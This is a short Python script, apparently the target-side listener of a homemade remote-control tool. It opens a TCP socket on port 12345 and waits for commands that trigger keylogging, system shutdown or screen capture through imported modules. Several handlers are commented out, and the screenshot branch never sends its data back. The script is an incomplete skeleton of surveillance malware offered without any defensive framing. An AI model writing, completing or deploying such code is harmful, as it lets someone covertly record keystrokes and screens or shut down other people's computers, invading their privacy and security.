import socket
import takepic
import keylog
import shutdown


def receiveSignal():
    choice = 'QUIT'
    try:
        choice = (conn.recv(2048)).decode()
    except:
        choice = 'QUIT'
    finally:
        return choice
    
def TAKEPIC():
    screenshot_data = takepic.start_takepic()
    conn.sendall(screenshot_data)


def listen_choices():
    while True:
        choice = receiveSignal()
        if choice == 'KEYLOG':
            #keylog.start_keylog()
            break
        elif choice == 'SHUTDOWN':
            #shutdown.start_shutdown()
            break
        # # elif choice =='REGISTRY':
        # #     registry()
        # #     break
        elif choice == 'TAKEPIC':
            takepic.start_takepic()
            break
        # # elif choice == 'PROCESS':
        # #     process()
        # #     break
        # # elif choice == 'APPLICATION':
        # #     application()
        # #     break
        elif choice == 'QUIT': break
  

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
print ("Socket successfully created")
ip = socket.gethostname()

port = 12345                
  
s.bind((ip, port))         
print ("socket binded to %s" %(port)) 
  
s.listen(100)     
print ("socket is listening")            

while True: 
  
# Establish connection with client. 
    conn, addr = s.accept()     
    print ('Got connection from', addr )
    
    listen_choices()
    conn.close()
    break
# Close the connection with the client 
s.close()
